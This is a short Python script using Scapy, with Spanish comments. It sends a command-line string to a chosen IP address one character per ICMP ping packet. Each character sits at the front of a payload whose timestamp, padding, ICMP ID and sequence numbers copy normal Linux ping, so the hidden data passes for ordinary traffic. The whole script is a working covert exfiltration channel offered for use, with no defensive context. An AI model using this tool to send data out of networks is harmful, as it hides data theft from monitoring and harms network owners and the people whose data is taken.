#!/usr/bin/env python3
import sys
import time
import struct
import os
from scapy.all import IP, ICMP, Raw, send

def main():
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <IP_destino> <string>")
        sys.exit(1)

    destino = sys.argv[1]
    mensaje = sys.argv[2]

    # ICMP ID real: usa el PID del proceso actual (comportamiento nativo de Linux)
    icmp_id = os.getpid() & 0xFFFF
    seq_num = 1
    # IP ID inicial aleatorio/dinámico como hace el stack de red
    ip_id = (os.getpid() + 100) & 0xFFFF 

    for caracter in mensaje:
        # 1. Timestamp ICMP de 8 bytes
        t_now = time.time()
        tv_sec = int(t_now)
        tv_usec = int((t_now - tv_sec) * 1000000)
        timestamp_bytes = struct.pack("<QQ", tv_sec, tv_usec)

        # 2. Carácter inyectado
        char_byte = caracter.encode("utf-8")

        # 3. Padding estándar de Linux (0x10 a 0x37)
        padding_pattern = bytes([i for i in range(0x10, 0x38)])
        padding = padding_pattern[len(char_byte):]

        payload_coherente = char_byte + timestamp_bytes + padding

        # Se fuerzan los incrementos explícitos por paquete
        paquete = IP(dst=destino, id=ip_id) / \
                  ICMP(type="echo-request", id=icmp_id, seq=seq_num) / \
                  Raw(load=payload_coherente)

        send(paquete, verbose=False)
        print(f"[+] Enviado '{caracter}' | IP ID: {ip_id} | ICMP ID: {icmp_id} | Seq: {seq_num}")

        # Incremento estricto de IP ID y Sequence Number
        ip_id = (ip_id + 1) & 0xFFFF
        seq_num = (seq_num + 1) & 0xFFFF
        time.sleep(1)

if __name__ == "__main__":
    main()
